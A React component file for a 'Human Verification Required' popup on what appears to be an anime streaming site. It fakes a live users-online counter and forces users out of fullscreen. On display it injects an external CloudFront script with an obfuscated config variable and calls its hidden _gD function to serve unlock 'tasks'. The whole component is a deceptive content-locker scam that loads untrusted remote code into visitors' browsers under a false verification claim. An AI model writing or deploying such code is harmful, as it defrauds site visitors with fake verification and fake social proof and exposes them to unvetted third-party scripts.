import { useState, useEffect, useRef } from 'react';
import './VerifyPopup.css';

// Popup timing rules
const SHOW_TIME_MS = 6 * 60 * 1000;        // 6 minutes
const FIRST_DELAY_MS = 150 * 1000;           // 1 second
const WEEKLY_INTERVAL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days

const VerifyPopup = () => {
  const [isVisible, setIsVisible] = useState(false);
  const [onlineUsers, setOnlineUsers] = useState(5993);
  const instructionsContainerRef = useRef(null);
  const scriptsLoadedRef = useRef(false);
  const scriptElementsRef = useRef([]);
  
  // Function to handle showing instructions
  const expandInstructions = () => {
    if (instructionsContainerRef.current) {
      instructionsContainerRef.current.style.display = 
        instructionsContainerRef.current.style.display === 'block' ? 'none' : 'block';
    }
  };

  // Function to simulate online counter updates
  useEffect(() => {
    const updateOnlineCounter = () => {
      // Random change between -5 and +5
      const change = Math.floor(Math.random() * 11) - 5;
      setOnlineUsers(prevCount => {
        const newCount = prevCount + change;
        // Prevent the count from dropping below a realistic minimum
        return newCount < 5993 ? 5993 : newCount;
      });
    };

    const counterInterval = setInterval(updateOnlineCounter, 5000);
    return () => clearInterval(counterInterval);
  }, []);

  // Function to exit fullscreen mode when popup appears
  useEffect(() => {
    const exitFullscreen = () => {
      if (document.fullscreenElement) {
        document.exitFullscreen()
          .then(() => console.log("Exited fullscreen mode"))
          .catch((err) => console.error("Error exiting fullscreen:", err));
      }
    };

    const resetOrientation = () => {
      if (window.screen.orientation && window.screen.orientation.type.startsWith("landscape")) {
        window.screen.orientation.lock("portrait")
          .then(() => console.log("Orientation reset to portrait"))
          .catch((err) => console.error("Error resetting orientation:", err));
      }
    };

    if (isVisible) {
      exitFullscreen();
      resetOrientation();
    }
  }, [isVisible]);

  // Script loading effect - runs when popup becomes visible
  useEffect(() => {
    // Only load scripts if the popup is visible and scripts haven't been loaded yet
    if (isVisible && !scriptsLoadedRef.current) {
      const loadScripts = () => {
        // Create and append inline configuration script
        const configScript = document.createElement('script');
        configScript.type = 'text/javascript';
        configScript.text = 'var ArSRo_yjH_kyQtBc = { "it": 4430040, "key": "a9946" };';
        document.body.appendChild(configScript);
        
        // Create and append external CloudFront script
        const externalScript = document.createElement('script');
        externalScript.src = 'https://d2v7l2267atlz5.cloudfront.net/cd57196.js';
        externalScript.async = true;
        
        // Handle loading errors
        externalScript.onerror = () => {
          console.error('Failed to load verification script');
        };
        
        document.body.appendChild(externalScript);
        
        // Save references to the script elements for cleanup
        scriptElementsRef.current = [configScript, externalScript];
        scriptsLoadedRef.current = true;
      };
      
      loadScripts();
    }
    
    // Cleanup function - remove scripts when popup closes or component unmounts
    return () => {
      if (!isVisible && scriptsLoadedRef.current) {
        // Remove script elements if they exist
        scriptElementsRef.current.forEach(scriptElement => {
          if (scriptElement && scriptElement.parentNode) {
            scriptElement.parentNode.removeChild(scriptElement);
          }
        });
        
        // Reset the refs
        scriptElementsRef.current = [];
        scriptsLoadedRef.current = false;
      }
    };
  }, [isVisible]);

  // Main popup timing logic
  useEffect(() => {
    const now = Date.now();
    const popupStartTime = localStorage.getItem("popupStartTime");
    const lastPopupTime = localStorage.getItem("lastPopupTime");

    const shouldShowPopup = () => {
      if (!lastPopupTime || now - parseInt(lastPopupTime, 10) >= WEEKLY_INTERVAL_MS) {
        return true; // Show if weekly interval has passed
      }
      if (popupStartTime && now - parseInt(popupStartTime, 10) < SHOW_TIME_MS) {
        return true; // Show if within the display window
      }
      return false;
    };

    if (shouldShowPopup()) {
      if (popupStartTime) {
        // Show instantly if within the display window
        setIsVisible(true);
      } else {
        // Delay for first-time visitors
        const timer = setTimeout(() => {
          localStorage.setItem("popupStartTime", Date.now()); // Start timer
          setIsVisible(true);
        }, FIRST_DELAY_MS);
        
        return () => clearTimeout(timer);
      }
    }

    // Auto-close popup after SHOW_TIME_MS
    if (isVisible) {
      const closeTimer = setTimeout(() => {
        setIsVisible(false);
        localStorage.setItem("lastPopupTime", Date.now()); // Update the last popup display time
      }, SHOW_TIME_MS);
      
      return () => clearTimeout(closeTimer);
    }
  }, [isVisible]);

  // Close popup handler
  const handleVerify = () => {
    if (window._gD && typeof window._gD === 'function') {
      window._gD();
    } else {
      console.warn('Verification function not available yet');
    }
  };

  if (!isVisible) return null;

  return (
    <div className="popup-overlay" style={{ display: isVisible ? 'block' : 'none' }}>
      <div className="popup-content">
        <img src="https://animesobt.great-site.net/logo.png" alt="Logo" className="popup-logo" />
        <h2>Human Verification Required</h2>
        <p>Honored user, kindly complete a quick verification to start streaming.</p>
        <button className="verify-btn" onClick={handleVerify}>Verify Now</button>
        <p className="instructions">
          Simply click <strong>"Verify Now"</strong>, to view available task. Please, Complete one task and your access will be unlocked instantly!!
        </p>
        <a className="how-to-btn" href="#" onClick={(e) => {e.preventDefault(); expandInstructions();}}>.</a>
        <p>Safe and Secure:</p>
        
        {/* Instructions Container */}
        <div id="instructions-container" ref={instructionsContainerRef} style={{ display: 'none' }}>
          {/* Country-specific instructions will be empty for now */}
        </div>
        
        {/* Online User Counter */}
        <div className="live-counter-container">
          <div className="counter-icon">
            {/* User SVG Icon */}
            <svg width="20" height="20" fill="#fff" viewBox="0 0 24 24">
              <path d="M12 12c2.209 0 4-1.791 4-4s-1.791-4-4-4-4 1.791-4 4 1.791 4 4 4zm0 2c-2.67 0-8 1.337-8 4v2h16v-2c0-2.663-5.33-4-8-4z"/>
            </svg>
          </div>
          <div className="counter-details">
            <div className="counter-text">
              <span className="counter-number">{onlineUsers}</span>
              <span className="counter-label">Users Online</span>
            </div>
            <div className="live-indicator"></div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerifyPopup; 